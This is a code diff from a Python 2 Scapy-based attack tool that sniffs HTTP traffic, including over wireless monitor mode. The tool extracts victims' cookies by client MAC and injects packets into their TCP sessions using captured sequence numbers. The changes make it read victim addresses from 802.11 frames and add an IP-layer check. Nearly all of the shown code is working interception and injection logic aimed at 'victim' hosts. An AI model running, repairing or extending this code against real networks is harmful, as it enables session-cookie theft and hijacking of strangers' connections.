@@ -165,7 +165,10 @@ def proc_packet(packet):
 				#BROADCAST MODE
 				if (TARGETED==0):
 					if (len(cookie.strip())==0):
-						print bcolors.WARNING+"[!] No cookie found for website",host.lower(),"on client",packet.getlayer(Ether).src+bcolors.ENDC
+						if (MONITOR):
+							print bcolors.WARNING+"[!] No cookie found for website",host.lower(),"on client",packet.getlayer(Dot11).src+bcolors.ENDC
+						else:
+							print bcolors.WARNING+"[!] No cookie found for website",host.lower(),"on client",packet.getlayer(Ether).src+bcolors.ENDC
 					else:
 						print ret
 						if (MONITOR):
@@ -187,7 +190,10 @@ def proc_packet(packet):
 						if (m_mac.lower()==packet.getlayer(Ether).src.lower()):
 							TARGET_IN_LIST=1
 							if (len(cookie.strip())==0):
-								print bcolors.WARNING+"[!] No cookie found for website",host.lower(),"on client",packet.getlayer(Ether).src+bcolors.ENDC
+								if (MONITOR):
+									print bcolors.WARNING+"[!] No cookie found for website",host.lower(),"on client",packet.getlayer(Dot11).src+bcolors.ENDC
+								else:
+									print bcolors.WARNING+"[!] No cookie found for website",host.lower(),"on client",packet.getlayer(Ether).src+bcolors.ENDC
 							else:
 								print ret
 								if (MONITOR):
@@ -300,14 +306,13 @@ def http_header(packet):
 		getarg=packet.load.split()[1]
 	except:
 		getarg="NULL"
-
 	else:
 		pass
 	#TODO: Improve this check and implement --covert mode with stricter checks
         if (http_packet.find('GET') and (getarg.find("php") or getarg.find("asp") or getarg.find("htm") or getarg.find("html")) ):
 		#MONITOR MODE:
 		if (MONITOR):
-			if ("GET" in packet.sprintf("{Raw:%Raw.load%}\n") ):
+			if ("GET" in packet.sprintf("{Raw:%Raw.load%}\n") and packet.haslayer(IP)):
 #				print list(expand(packet))
 				vicmac=packet.getlayer(Dot11).addr2
 				rtrmac=packet.getlayer(Dot11).addr1
@@ -322,7 +327,6 @@ def http_header(packet):
 				acknum=str(int(packet.getlayer(TCP).seq)+size)
 				seqnum=packet.getlayer(TCP).ack
 				start_injection(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum)
-
 		else:
 			if (packet.haslayer(IP)):
 #			ls(packet)
@@ -381,7 +385,7 @@ def process_targeted_packet(packet):
 				if (MONITOR):
 					if ("GET" in packet.sprintf("{Raw:%Raw.load%}\n") ):
 						if (packet.getlayer(Dot11).addr2==m_mac.lower()):
-			#				print list(expand(packet))
+#							print list(expand(packet))
 							vicmac=packet.getlayer(Dot11).addr2
 							rtrmac=packet.getlayer(Dot11).addr1
 							vicip=packet.getlayer(IP).src
